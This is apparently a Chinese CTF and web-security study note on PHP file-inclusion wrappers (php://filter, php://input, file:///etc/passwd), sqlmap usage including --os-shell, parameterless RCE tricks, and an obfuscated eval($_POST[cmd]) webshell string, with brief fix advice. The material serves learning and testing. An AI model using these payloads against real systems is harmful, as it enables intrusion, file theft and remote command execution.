title=\"二、常见协议\"></a>二、常见协议</h2><h3 id=\"1-data\"><a href=\"#1-data\" class=\"headerlink\" title=\"1. data:\"></a>1. data:</h3><p>访问本地文件系统 </p>\n<p>实例：<strong>1.?file=data:text/plain,  #GET数据</strong></p>\n<p>此时对输入执行file_get_contents</p>\n<p>data://text/plain,I%20have%20a%20dream  # z直接读取plain后的内容</p>\n<p><strong>2.?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=  #后面的base64字符是需要传入的字符串的base64编码</strong></p>\n<h3 id=\"2-phar\"><a href=\"#2-phar\" class=\"headerlink\" title=\"2. phar:\"></a>2. phar:</h3><p>可以查找指定压缩包内的文件，说通俗点就是php解压缩包的一个函数，解压的压缩包与后缀无关。</p>\n<p>实例：**filename=**<strong>phar://test.[zip/jpg/png…]/file.txt</strong>  phar://test.rar/1.txt</p>\n<p>可以将任意后缀名的文件(必须要有后缀名)，只要是zip格式压缩的，都可以进行解压，因此上面可以改为<strong>phar://test.test/file.txt</strong>也可以运行。</p>\n<h3 id=\"3-temp\"><a href=\"#3-temp\" class=\"headerlink\" title=\"3. temp:\"></a>3. temp:</h3><p>一个类似文件 包装器的数据流，允许读写临时数据.会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。</p>\n<h3 id=\"4-php-x2F-x2F-filter\"><a href=\"#4-php-x2F-x2F-filter\" class=\"headerlink\" title=\"4. php://filter:\"></a>4. php://filter:</h3><p>(1) 一般用于任意文件读取，有时也可以用于getshell.在双OFF的情况下也可以使用.  php://filter/read=string.rot13/resource=123.txt</p>\n<p>php://filter/convert.base64-decode/resource</p>\n<p>(2) 参数设置：read用于include()和file_get_contents(),write用于file_put_contents()中。</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041432582.png\" alt=\"image-20200630094832964\"></p>\n<p><strong>①实例用法：</strong> <strong>php://filter/[read/write]=string.[rot13/strip_tags/…..]/resource=xxx</strong></p>\n<p><strong>②</strong> <strong>php://filter/convert.base64-[encode/decode]/resource=xxx</strong></p>\n<figure class=\"highlight awk\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">php:<span class=\"hljs-regexp\">//</span>filter<span class=\"hljs-regexp\">/read=convert.base64-encode/</span>resource=index.php<br></code></pre></td></tr></tbody></table></figure>\n\n<p>这是使用的过滤器是convert.base64-encode.它的作用就是读取upload.php的内容进行base64编码后输出。可以用于读取程序源代码经过base64编码后的数据</p>\n<p>例题：BSidesCF 2020]Had a bad day</p>\n<h3 id=\"5-php-x2F-x2F-input\"><a href=\"#5-php-x2F-x2F-input\" class=\"headerlink\" title=\"5. php://input:\"></a>5. php://input:</h3><p>可以访问请求的原始数据的只读流，<strong>将post请求的数据当作php代码执行</strong>。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。enctype=”multipart/form-data时，php://input是无效的。</p>\n<p>实例：**file=**<strong>php://input   hackbarPost数据</strong></p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041432587.png\" alt=\"image-20200630094919052\"></p>\n<h3 id=\"6-memory\"><a href=\"#6-memory\" class=\"headerlink\" title=\"6. memory:\"></a>6. memory:</h3><p>是一个类似文件 包装器的数据流，允许读写临时数据，总是把数据储存在内存中</p>\n<p>\\7. file:f在双OFF的时候也可以用，用于本地文件包含注：file://协议必须是绝对路径</p>\n<p>实例：file:// [文件的绝对路径和文件名]</p>\n<p><strong>Linux：</strong><a href=\"http://127.0.0.1/FI/LFI.php?file=file:///etc/passwd\"><strong>http://127.0.0.1/FI/LFI.php?file=file:///etc/passwd</strong></a></p>\n<p><strong>Windows：<a href=\"http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt\">http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt</a></strong></p>\n<h3 id=\"8-zip\"><a href=\"#8-zip\" class=\"headerlink\" title=\"8.zip:\"></a>8.zip:</h3><p>压缩流。</p>\n<h3 id=\"9-Expect\"><a href=\"#9-Expect\" class=\"headerlink\" title=\"9.Expect:\"></a>9.Expect:</h3><p>处理交互式的流</p>\n<p>总的来说就是：</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041432590.png\" alt=\"image-20200630094950772\"></p>\n<p>gopher协议配合ssrf利用</p>\n<h2 id=\"三，常见漏洞函数\"><a href=\"#三，常见漏洞函数\" class=\"headerlink\" title=\"三，常见漏洞函数\"></a>三，常见漏洞函数</h2><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">include</span>、<br><span class=\"hljs-keyword\">require</span>、<br><span class=\"hljs-keyword\">include_once</span>、<br><span class=\"hljs-keyword\">require_once</span>、<br>highlight_file 、<br>show_source 、<br>readfile 、<br>file_get_contents 、<br>fopen 、<br>file<br></code></pre></td></tr></tbody></table></figure>\n\n<p>敏感目录：file=/etc/apache2/apache2.conf</p>\n<h2 id=\"漏洞修复\"><a href=\"#漏洞修复\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h2><p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041429150.png\" alt=\"image-20221030144318465\"></p>\n<ul>\n<li><p>File=php://filter:[payload]</p>\n<ul>\n<li>概念：源封装器，用于数据流打开时的筛选过滤应用。</li>\n<li>配合函数：readfile，file，file_get_contents进行读取</li>\n<li>payload：file=php://filter/read=convert.base64-encode/resource=flag.php</li>\n<li>可选择各种编码获取读出的内容：</li>\n<li>注意：在file_put_content函数中第一个参数时输出内容的文件名，也可以使用伪协议将任何输入该文件的内容都进行解码或编码</li>\n</ul>\n</li>\n<li><p>File=php://input;</p>\n<ul>\n<li><p>要求allow_url_include必须是on的情况，此时直接post任何内容都会被当作php代码执行</p>\n</li>\n<li><p>Include 函数的参数可以是file协议，能够通过该方式读取文件绝对路径，将内容视为php代码执行</p>\n</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"SQLMAP玩法\"><a href=\"#SQLMAP玩法\" class=\"headerlink\" title=\"SQLMAP玩法\"></a>SQLMAP玩法</h1><p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041429887.png\" alt=\"image-20221030144328542\"></p>\n<p>SQLmap玩法：</p>\n<ul>\n<li><p>sqlmap -u “<a href=\"http://192.168.234.1/sqli-labs-master/Less-1/?id=5\">http://192.168.234.1/sqli-labs-master/Less-1/?id=5</a>“ –tables 查询表名</p>\n</li>\n<li><p>sqlmap -u “<a href=\"http://192.168.234.1/sqli-labs-master/Less-1/?id=5\">http://192.168.234.1/sqli-labs-master/Less-1/?id=5</a>“ –db 用于查询当前的数据库</p>\n</li>\n<li><p>sqlmap -u “<a href=\"http://192.168.234.1/sqli-labs-master/Less-1/?id=5\">http://192.168.234.1/sqli-labs-master/Less-1/?id=5</a>“ –os-shell 获取目标主机的shell</p>\n</li>\n<li><p>sqlmap -u “<a href=\"http://192.168.234.1/sqli-labs-master/Less-1/?id=5\">http://192.168.234.1/sqli-labs-master/Less-1/?id=5</a>“ -D “security” –tables</p>\n</li>\n<li><p>-samrt 用于智能测试目标主机的情况.</p>\n</li>\n<li><p>其中的dump是用于读出来全部的数据</p>\n</li>\n</ul>\n<p>判断数据库类型：</p>\n<ul>\n<li>常见规律：</li>\n</ul>\n<p>php : Mysql</p>\n<p>jsp : Oracle</p>\n<p>挖过哪些漏洞？</p>\n<ul>\n<li>越权，弱口令，xss</li>\n</ul>\n<p>修复文件包含？</p>\n<ul>\n<li>使用open_basedir()配置限制访问在指定的区域</li>\n<li>过滤特殊字符，尽量关闭allow_url_include</li>\n</ul>\n<h1 id=\"命令注入\"><a href=\"#命令注入\" class=\"headerlink\" title=\"命令注入\"></a>命令注入</h1><h3 id=\"无参数RCE\"><a href=\"#无参数RCE\" class=\"headerlink\" title=\"无参数RCE\"></a>无参数RCE</h3><p>[<a href=\"https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE]\">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE]</a>(<a href=\"https://skysec.top/2019/03/2\">https://skysec.top/2019/03/2</a>\t9/PHP-Parametric-Function-RCE/#什么是无参数函数RCE)</p>\n<h3 id=\"current-localeconv\"><a href=\"#current-localeconv\" class=\"headerlink\" title=\"current(localeconv())\"></a>current(localeconv())</h3><hr>\n<p>该函数得到的内容永远是点</p>\n<figure class=\"highlight lisp\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs lisp\">scandir(<span class=\"hljs-name\">current</span>(<span class=\"hljs-name\">localeconv</span>()))<span class=\"hljs-comment\">; </span><br>print_r(<span class=\"hljs-name\">scandir</span>(<span class=\"hljs-name\">pos</span>(<span class=\"hljs-name\">localeconv</span>())))<span class=\"hljs-comment\">; #  即这两个表达式会返回当前的目录内容</span><br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"常见命令注入操作函数\"><a href=\"#常见命令注入操作函数\" class=\"headerlink\" title=\"常见命令注入操作函数\"></a>常见命令注入操作函数</h3><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-title function_ invoke__\">file_get_contents</span>(),<span class=\"hljs-title function_ invoke__\">readfile</span>(),<span class=\"hljs-title function_ invoke__\">highlight_file</span>() <span class=\"hljs-comment\"># 读取文件内容</span><br><span class=\"hljs-title function_ invoke__\">getcwd</span>() <span class=\"hljs-comment\"># 用于获取当前目录</span><br><span class=\"hljs-title function_ invoke__\">scandir</span>(<span class=\"hljs-title function_ invoke__\">getcwd</span>()) <span class=\"hljs-comment\"># 配合scandir即可得到当前的目录</span><br><span class=\"hljs-title function_ invoke__\">dirname</span>() <span class=\"hljs-comment\"># 用于返回当前所在的文件夹</span><br><span class=\"hljs-title function_ invoke__\">chdir</span>(<span class=\"hljs-title function_ invoke__\">dirname</span>(<span class=\"hljs-title function_ invoke__\">getcwd</span>()))  <span class=\"hljs-comment\"># 即可切换到上一个文件夹目录</span><br><span class=\"hljs-title function_ invoke__\">array_flip</span>() <span class=\"hljs-comment\"># 对数组中的值和键进行翻转</span><br><span class=\"hljs-title function_ invoke__\">array_reverse</span>() <span class=\"hljs-comment\"># 将数组中的元素顺序进行翻转</span><br><span class=\"hljs-title function_ invoke__\">prev</span>() - 将内部指针指向数组中的上一个元素，并输出<br><span class=\"hljs-title function_ invoke__\">current</span>() - 返回数组中的当前元素的值<br><span class=\"hljs-title function_ invoke__\">next</span>() - 返回数组中的下一个元素<br><span class=\"hljs-title function_ invoke__\">end</span>() - 将内部指针指向数组中的最后一个元素，并输出<br><span class=\"hljs-title function_ invoke__\">reset</span>() - 将内部指针指向数组中的第一个元素，并输出<br><span class=\"hljs-title function_ invoke__\">each</span>() - 返回当前元素的键名和键值，并将内部指针向前移动<br>apache2 专属函数 <span class=\"hljs-title function_ invoke__\">getallheaders</span>() <span class=\"hljs-comment\"># 获取http请求头的内容并返回一个数组</span><br><span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-title function_ invoke__\">hex2bin</span>(<span class=\"hljs-title function_ invoke__\">session_id</span>(<span class=\"hljs-title function_ invoke__\">session_start</span>()))) <span class=\"hljs-comment\"># 执行Cookie中传入的PHPSESSID 的值，但需要进行十六进制编码</span><br>    <br>{}可以用来代替[]<br><span class=\"hljs-title function_ invoke__\">base_convert</span>(<span class=\"hljs-number\">37907361743</span>,<span class=\"hljs-number\">10</span>,<span class=\"hljs-number\">36</span>)  <span class=\"hljs-comment\"># 将第一个字符串从 十进制转换为36进制，此处的转换结果为hex2bin</span><br><span class=\"hljs-title function_ invoke__\">hex2bin</span>() <span class=\"hljs-comment\"># 将16进制转换为字符串</span><br><span class=\"hljs-title function_ invoke__\">dechex</span>() <span class=\"hljs-comment\"># 将其中的函数转换为16进制，转换的时候是直接转换 0x5f474554  - &gt; int(0x5f474554) 1598506324</span><br><span class=\"hljs-title function_ invoke__\">base_convert</span>(<span class=\"hljs-number\">37907361743</span>,<span class=\"hljs-number\">10</span>,<span class=\"hljs-number\">36</span>)(<span class=\"hljs-title function_ invoke__\">dechex</span>(<span class=\"hljs-number\">1598506324</span>));<span class=\"hljs-variable\">$$pi</span>{abs}(<span class=\"hljs-variable\">$$pi</span>{asin}) <span class=\"hljs-comment\"># $_GET[abs]($_GET[asin]) 即可进行任意命令执行</span><br><br><br><span class=\"hljs-title function_ invoke__\">getallheaders</span>() <span class=\"hljs-comment\"># 获取消息头部   getallheaders(){1} 即可获得键为1的消息头部值，此时在消息头部写上1:cat /flag即可得到字符串</span><br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<p>($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat+/flag  77763910388090860000</p>\n<h3 id=\"编码注入\"><a href=\"#编码注入\" class=\"headerlink\" title=\"编码注入\"></a>编码注入</h3><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br>a=′assert′;<span class=\"hljs-title function_ invoke__\">echourlencode</span>( a).<span class=\"hljs-string\">\"\\n\"</span>;<br>b=′(<span class=\"hljs-keyword\">eval</span>(_POST[cmd]))<span class=\"hljs-string\">';</span><br><span class=\"hljs-string\">echo urlencode(~$b).\"\\n\";</span><br><span class=\"hljs-string\"></span><br><span class=\"hljs-string\"># 生成字符串(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6);</span><br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h2 id=\"对于字符的绕过\"><a href=\"#对于字符的绕过\" class=\"headerlink\" title=\"对于字符的绕过\"></a>对于字符的绕过</h2><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br> <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-title function_ invoke__\">ip2long</span>(<span class=\"hljs-string\">'47.100.33.58'</span>)<br> <span class=\"hljs-meta\">?&gt;</span><br> <span class=\"hljs-comment\"># 使用以上代码得到的内容依然可以访问</span><br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h2 id=\"PHP执行绕过\"><a href=\"#PHP执行绕过\" class=\"headerlink\" title=\"PHP执行绕过\"></a>PHP执行绕过</h2><figure class=\"highlight x86asm\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs x86asm\">tar cvf <span class=\"hljs-keyword\">test</span> <span class=\"hljs-number\">1.</span>php 将<span class=\"hljs-number\">1.</span>php打包为<span class=\"hljs-keyword\">test</span>，使用PHP执行<span class=\"hljs-keyword\">test</span>即可运行其中的代码<br><br>tar cvf <span class=\"hljs-number\">aech</span> /目录  将其打包但是不压缩，其中的代码依然会明文保存，使用php <span class=\"hljs-number\">aech</span>依然会执行<br></code></pre></td></tr></tbody></table></figure>\n\n",
            "tags": [
                "web",
                "exploit"
            ]
        }
    ]
}